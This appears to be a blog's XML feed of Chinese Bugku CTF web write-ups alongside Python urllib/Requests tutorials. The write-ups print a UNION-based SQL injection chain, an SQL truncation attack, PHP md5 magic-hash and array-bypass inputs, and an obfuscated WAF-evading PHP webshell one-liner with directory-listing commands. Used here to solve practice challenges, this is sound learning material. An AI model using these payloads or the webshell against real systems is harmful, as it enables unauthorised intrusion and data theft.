class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>bp抓包构造包:<br>构造Cookie: margin=margin<br>注意 filename 后的参数 keys.txt 要经过 base64 编码<br><img src="https://i.imgur.com/6SbvPel.png" alt></p>
<p>得到:KEY{key_keys}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_Requests模块初级使用</title>
    <url>/2018/08/13/Python-Requests%E6%A8%A1%E5%9D%97%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h1><p>先导入Requests模块</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure>

<p>获取某个网页</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = requests.get(<span class="string">'url'</span>) <span class="comment">#一个名为 r 的 Response 对象</span></span><br><span class="line"><span class="attr">r</span> = requests.post(<span class="string">'url'</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;) <span class="comment">#发送一个 HTTP POST 请求</span></span><br><span class="line"><span class="attr">r</span> = requests.put(<span class="string">'url'</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;) <span class="comment">#发送一个 HTTP PUT 请求</span></span><br><span class="line"><span class="attr">r</span> = requests.delete(<span class="string">'url'</span>) <span class="comment">#发送一个 HTTP DELETE 请求</span></span><br><span class="line"><span class="attr">r</span> = requests.head(<span class="string">'url'</span>) <span class="comment">#发送一个 HTTP HEAD 请求</span></span><br><span class="line"><span class="attr">r</span> = requests.options(<span class="string">'url'</span>) <span class="comment">#发送一个 HTTP OPTIONS 请求</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-这是一个神奇的登陆框</title>
    <url>/2018/08/09/Writeup/bugkuWeb/WP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p>
<p>寻找注入点，找到<code>1&quot;</code>双引号会报错<br><img src="https://i.imgur.com/x9z5SYO.png" alt></p>
<p>order by判断字段数:<br><code>1&quot;order by 1,2,3--</code></p>
<p>找表:<br><code>1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--</code><br><img src="https://i.imgur.com/dIPRsuy.png" alt><br>根据提示，得到表flag1，whoami</p>
<p>继续找列<br><code>1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;--</code><br><img src="https://i.imgur.com/evQXsji.png" alt></p>
<p>找字段<br><code>1&quot; union select flag1,2 from flag1--</code></p>
<p>得到Login_Name:ed6b28e684817d9efcaf802979e57aea</p>
<p>flag{ed6b28e684817d9efcaf802979e57aea}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-login1(SKCTF)</title>
    <url>/2018/08/09/Writeup/bugkuWeb/WP-Bugku-login1-SKCTF/</url>
    <content><![CDATA[<p>题目地址:<a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a></p>
<p>本文转载自:<a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/bugku-writeup4/</a></p>
<p>这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE<span class="built_in"> users </span>(</span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br></pre></td></tr></table></figure>

<p>这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。</p>
<p>SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>SQL约束攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-多次</title>
    <url>/2018/08/09/Writeup/bugkuWeb/WP-Bugku-%E5%A4%9A%E6%AC%A1/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:9004/" target="_blank" rel="noopener">http://120.24.86.145:9004/</a></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-md5 collision(NUPT_CTF)</title>
    <url>/2018/08/09/Writeup/bugkuWeb/WP-Bugku-md5-collision-NUPT-CTF/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a></p>
<p>md5 collision(MD5碰撞):本段转自<a href="https://www.jianshu.com/p/2791e2fdadfd" target="_blank" rel="noopener">https://www.jianshu.com/p/2791e2fdadfd</a></p>
<ul>
<li>MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。</li>
<li>在PHP中的MD5中的0e的比较:PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</li>
</ul>
<p>这里给出常用的0e开头的MD5:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure>

<p>抓包测试得到flag{md5_collision_is_easy}<br><img src="https://i.imgur.com/DkQe2JO.png" alt></p>
<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-前女友(SKCTF)</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)/</url>
    <content><![CDATA[<p>题目链接:<a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a></p>
<p>打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $v1 = $_GET[<span class="string">'v1'</span>];</span></span><br><span class="line"><span class="php">    $v2 = $_GET[<span class="string">'v2'</span>];</span></span><br><span class="line"><span class="php">    $v3 = $_GET[<span class="string">'v3'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><font color="red">在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null</font>,这样就得到答案了。</p>
<p>所以构造出参数:<br><code>?v1[]=1&amp;v2[]=2&amp;v3[]=3</code><br>url:<br><a href="http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3" target="_blank" rel="noopener">http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3</a></p>
<p>得到SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p>
<blockquote>
<p><a href="http://AbelChe.com/2018/08/18/Writeup/WP-Bugku-各种绕过/">这里链接一道也是利用数组的题</a></p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-字符?正则?</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99/</url>
    <content><![CDATA[<p>题目代码:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'2.php'</span>);</span></span><br><span class="line"><span class="php">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span></span><br><span class="line"><span class="php">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $IM )&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i</code>这一串正则表达式<br><a href="#1"><font color="darkred">(关于正则点这里)</font></a><br>能够构造出:<br><code>?id=key1key22222key:/3/keyz;</code></p>
<p>构造url:<br><a href="http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz</a>;</p>
<p>得到KEY{0x0SIOPh550afc}</p>
<hr>
<div id="1"></div>
### 正则表达的整理:
    1.表达式直接写出来的字符串直接利用，如key
    2.“.”代表任意字符
    3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以'^'开头，以'$'结束
    4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束
    5.[a-z]代表a-z中的任意一个字符
    6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号
    7./i代表大小写不敏感
    8.{4-7}代表[0-9]中数字连续出现的次数是4-7次
    9.\s匹配任意的空白符
    10.\d   匹配数字
    11.\b   匹配单词的开始或结束


<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-过狗一句话</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p>
<p>送给大家一个过狗一句话:<br><code>&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt;</code></p>
<p>搜索到的几种解法:<br>    1. s=print_r(scandir(‘./‘))<br>    <a href="http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;)" target="_blank" rel="noopener">http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;)</a>)</p>
<pre><code>2. s=print_r(glob(&quot;*.*&quot;))
http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;))</code></pre><p>scandir()函数:</p>
<blockquote>
<p>scandir() 函数返回指定目录中的文件和目录的数组。<br><img src="https://i.imgur.com/FpX8LXY.png" alt><br>glob()函数:<br>glob() 函数返回匹配指定模式的文件名或目录。<br>该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。<br><img src="https://i.imgur.com/VXFVlN9.png" alt></p>
</blockquote>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>python3抓取页面内容</title>
    <url>/2018/08/08/python3%E6%8A%93%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9/</url>
    <content><![CDATA[<p><font color="DarkViolet" size="5"><center><strong>环境:python3</strong></center></font></p>
<hr>
<h2 id="最简单"><a href="#最简单" class="headerlink" title="最简单"></a>最简单</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response = urllib.request.urlopen('http://python.org/')</span><br><span class="line">html = response.read()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="使用request"><a href="#使用request" class="headerlink" title="使用request"></a>使用request</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = urlopen(req)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  <span class="keyword">if</span> hasattr(e, <span class="string">'reason'</span>):</span><br><span class="line">    print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">    print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line">  <span class="keyword">elif</span> hasattr(e, <span class="string">'code'</span>):</span><br><span class="line">    print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">    print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">url = <span class="string">'http://localhost/login.php'</span></span><br><span class="line">user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">values = &#123;</span><br><span class="line">     <span class="string">'act'</span> : <span class="string">'login'</span>,</span><br><span class="line">     <span class="string">'login[email]'</span> : <span class="string">'yzhang@i9i8.com'</span>,</span><br><span class="line">     <span class="string">'login[password]'</span> : <span class="string">'123456'</span></span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">data = urllib<span class="selector-class">.parse</span>.urlencode(values)</span><br><span class="line">req = urllib<span class="selector-class">.request</span>.Request(url, data)</span><br><span class="line">req.add_header(<span class="string">'Referer'</span>, <span class="string">'http://www.python.org/'</span>)</span><br><span class="line">response = urllib<span class="selector-class">.request</span>.urlopen(req)</span><br><span class="line">the_page = response.read()</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(the_page.decode(<span class="string">"utf8"</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="发送数据和header"><a href="#发送数据和header" class="headerlink" title="发送数据和header"></a>发送数据和header</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">url = 'http://localhost/login.php'</span><br><span class="line">user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span><br><span class="line">values = &#123;</span><br><span class="line">     'act' : 'login',</span><br><span class="line">     'login[email]' : 'yzhang@i9i8.com',</span><br><span class="line">     'login[password]' : '123456'</span><br><span class="line">     &#125;</span><br><span class="line">headers = &#123; 'User-Agent' : user_agent &#125;</span><br><span class="line">  </span><br><span class="line">data = urllib.parse.urlencode(values)</span><br><span class="line">req = urllib.request.Request(url, data, headers)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line">the_page = response.read()</span><br><span class="line">  </span><br><span class="line">print(the_page.decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="HTTP错误"><a href="#HTTP错误" class="headerlink" title="HTTP错误"></a>HTTP错误</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">req = urllib.request.<span class="constructor">Request('<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">www</span>.<span class="params">python</span>.<span class="params">org</span><span class="operator">/</span><span class="params">fish</span>.<span class="params">html</span>')</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  urllib.request.urlopen(req)</span><br><span class="line">except urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">  print(e.code)</span><br><span class="line">  print(e.read<span class="literal">()</span>.decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="异常处理1"><a href="#异常处理1" class="headerlink" title="异常处理1"></a>异常处理1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError, HTTPError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = urlopen(req)</span><br><span class="line"><span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">  print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">  print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">  print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="异常处理2"><a href="#异常处理2" class="headerlink" title="异常处理2"></a>异常处理2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = urlopen(req)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  <span class="keyword">if</span> hasattr(e, <span class="string">'reason'</span>):</span><br><span class="line">    print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">    print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line">  <span class="keyword">elif</span> hasattr(e, <span class="string">'code'</span>):</span><br><span class="line">    print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">    print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure>

<h2 id="HTTP认证"><a href="#HTTP认证" class="headerlink" title="HTTP认证"></a>HTTP认证</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line"><span class="comment"># create a password manager</span></span><br><span class="line">password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Add the username and password.</span></span><br><span class="line"><span class="comment"># If we knew the realm, we could use it instead of None.</span></span><br><span class="line">top_level_url = <span class="string">"https://cms.tetx.com/"</span></span><br><span class="line">password_mgr.add_password(None, top_level_url, 'yzhang', 'cccddd')</span><br><span class="line">  </span><br><span class="line">handler = urllib.request.HTTPBasicAuthHandler(password_mgr)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># create "opener" (OpenerDirector instance)</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># use the opener to fetch a URL</span></span><br><span class="line">a_url = <span class="string">"https://cms.tetx.com/"</span></span><br><span class="line">x = opener.open(a_url)</span><br><span class="line">print(x.read())</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Install the opener.</span></span><br><span class="line"><span class="comment"># Now all calls to urllib.request.urlopen use our opener.</span></span><br><span class="line">urllib.request.install_opener(opener)</span><br><span class="line">  </span><br><span class="line">a = urllib.request.urlopen(a_url).read().decode('utf8')</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">proxy_support = urllib<span class="selector-class">.request</span>.ProxyHandler(&#123;<span class="string">'sock5'</span>: <span class="string">'localhost:1080'</span>&#125;)</span><br><span class="line">opener = urllib<span class="selector-class">.request</span>.build_opener(proxy_support)</span><br><span class="line">urllib<span class="selector-class">.request</span>.install_opener(opener)</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="selector-tag">a</span> = urllib<span class="selector-class">.request</span>.urlopen(<span class="string">"http://g.cn"</span>).read().decode(<span class="string">"utf8"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line">import <span class="built_in">socket</span></span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line"><span class="comment"># timeout in seconds</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line"><span class="built_in">socket</span>.setdefaulttimeout(timeout)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># this call to urllib.request.urlopen now uses the default timeout</span></span><br><span class="line"><span class="comment"># we have set in the socket module</span></span><br><span class="line">req = urllib.request.Request(<span class="string">'http://twitter.com/'</span>)</span><br><span class="line"><span class="keyword">a</span> = urllib.request.urlopen(req).<span class="built_in">read</span>()</span><br><span class="line">print(<span class="keyword">a</span>)</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>抓取页面内容</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>WP_Bugku_变量1</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-%E5%8F%98%E9%87%8F1/</url>
    <content><![CDATA[<p>参考文章:<a href="https://blog.csdn.net/anjiaowangmenghan/article/details/76460872" target="_blank" rel="noopener">https://blog.csdn.net/anjiaowangmenghan/article/details/76460872</a></p>
<p>题目地址:<a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a></p>
